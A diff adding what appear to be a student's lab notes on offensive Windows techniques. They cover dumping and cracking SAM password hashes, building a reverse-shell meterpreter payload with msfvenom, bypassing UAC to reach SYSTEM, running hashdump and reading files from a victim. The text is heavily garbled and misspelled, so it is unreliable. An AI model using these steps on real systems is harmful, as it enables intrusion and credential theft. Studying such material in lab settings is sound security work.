@@ -1,0 +1,50 @@
+******************************************************************************************************************************************
+
+*************************************** task 1 *************************************************
+
+1 ] dumping and cracking Sam hashes to extract print text passwords 
+
+we have access of a victim machine then we can use pww 7 and oph crack tool 
+
+1] pwm 7 is a command line tool which have extension of dot exe extention  execute it on desktop totem hash is off Sam file
+
+2] oph crack is 46+gui tool that lods the hash file & after loaded Sam hashes file then we need to specify table to crack that hashes off Sir same file this has this tables under the table step in the application
+
+example : pwdump7.exe >  hash.txt
+
+*****************************************************************************************************************************************
+********************************************************task 5 **********************************************************************
+
+title : dumping sam hashes with privilage escalating privlages with metasploit 
+
+1]  create payload using msfvenome >>> msfvenome -p windows/meterpreter/reverse_tcp --platform windows -a x84 LHOST= .  LPORT= . -f exe 
+2] trasfer it to windows >>> service apache2 start  
+3] setup listner on msfconsole >>> use exploit/multi/handler , set paylaod  windows/meterpreter/reverse_tcp 
+
+************* ater getting normal access **********************
+
+4] run getuid command >>> normal user 
+5] run  getsystem command >>> error 
+6] backgrond the session  
+7] use exploit/windows/local/bypassuac_fodhelper 
+8] set options 
+9] use payload windows/meterpreter/reverse_tcp 
+10] exploit 
+11] getuid >>> here we see we loged as normal user 
+12] getsystem >> no error now we loged as nt/authority system 
+13] run hashdump command or run smart hashdump expoit 
+
+********************************************************************************************************************************************************************************************* task 6 *****************************************************************************
+title : read the secretfile from computer 
+
+1]  create payload using msfvenome >>> msfvenome -p windows/meterpreter/reverse_tcp --platform windows -a x84 LHOST= .  LPORT= . -f exe >> 
+payload.exe
+2] trasfer it to windows >>> service apache2 start  
+3] setup listner on msfconsole >>> use exploit/multi/handler , set paylaod  windows/meterpreter/reverse_tcp 
+4] after gabing acess read or download the file 
+5] timestop like command to check the information about date of modification , acessing etc 
+6] search -f filename >>> use to search for a file 
+
+****************************************************************************************************************************************************************************************** task 7 **********************************************************************************
+
+title 
